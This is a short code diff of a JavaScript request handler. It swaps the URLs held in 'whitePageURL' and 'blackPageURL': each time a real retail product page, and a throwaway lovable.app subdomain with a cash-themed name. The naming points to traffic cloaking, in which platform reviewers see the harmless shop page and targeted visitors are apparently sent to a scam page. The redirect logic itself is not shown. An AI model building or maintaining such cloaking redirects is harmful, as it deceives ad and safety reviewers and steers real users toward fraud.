@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/fc-bayern-muenchen-kapuzenpullover-fc-bayern-muenchen-i-hoodie-essential-i-kinder-i-navy-CS0GDC0BG/";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://www.colettehayman.com.au/collections/new/products/ashley-blue-denim-shoulder-bag-649264";
+    const blackPageURL = "https://casssshlov.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
